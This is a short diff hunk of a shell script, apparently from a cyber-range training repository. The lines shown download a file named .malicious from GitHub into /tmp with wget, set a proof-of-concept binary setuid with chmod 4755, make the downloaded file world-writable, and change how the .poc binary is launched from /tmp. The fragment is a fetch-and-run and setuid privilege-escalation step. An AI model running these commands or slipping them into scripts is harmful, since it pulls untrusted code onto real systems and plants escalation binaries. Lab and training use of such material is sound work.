@@ -3,4 +3,6 @@ wget -O /tmp/.malicious https://raw.githubusercontent.com/cappetta/CyberRange/ma
 
 chmod 4755 /tmp/.poc;
 chmod 777 /tmp/.malicious; 
-export BAD_PATH=/tmp; /tmp/.poc
+export BAD_PATH=/tmp; 
+cd /tmp/; 
+.poc
